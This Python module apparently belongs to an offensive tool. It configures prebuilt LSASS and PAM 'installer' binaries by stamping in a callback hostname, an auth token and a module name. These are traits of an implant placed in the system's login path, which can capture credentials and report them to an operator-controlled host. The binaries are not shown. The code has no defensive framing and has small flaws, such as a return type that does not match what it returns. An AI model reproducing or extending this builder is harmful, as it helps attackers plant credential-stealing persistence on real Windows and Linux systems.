from importlib import resources
import uuid

from . import installers

INSTALLER_DIR = resources.files(installers)

BANG_INSTALLER_LSASS = INSTALLER_DIR / "lsass" / "installer.exe"
BANG_INSTALLER_PAM = INSTALLER_DIR / "pam" / "installer"

# stamped configuration values - found and replaced in the installer binary
BANG_MODULE_NAME_STAMP = "BASKETBALLJONES"
BANG_HOSTNAME_STAMP = "EVERYBODYGETUP"
BANG_AUTH_TOKEN_STAMP = "00000000-0000-0000-0000-000000000000"


def _stamp_value(binary: bytes, stamp_pattern: bytes, stamp_data: bytes) -> bytes:
    idx = binary.index(stamp_pattern)
    return binary.replace(
        binary[idx : idx + len(stamp_data) + 1],
        stamp_data + b"\x00",
        1,
    )


def configure_bang_installer(hostname: str, auth_token: str, module_name: str, target: str) -> bytes:
    installer_path = BANG_INSTALLER_LSASS if target == "lsass" else BANG_INSTALLER_PAM
    encoding = "utf-16-le" if target == "lsass" else "utf-8"
    
    with open(installer_path, "rb") as f:
        installer_bin = f.read()

    installer_bin = _stamp_value(installer_bin, BANG_HOSTNAME_STAMP.encode(encoding), hostname.encode(encoding))
    installer_bin = _stamp_value(installer_bin, BANG_AUTH_TOKEN_STAMP.encode(encoding), auth_token.encode(encoding))
    installer_bin = _stamp_value(installer_bin, BANG_MODULE_NAME_STAMP.encode(encoding), module_name.encode(encoding))

    return installer_bin, installer_path.name
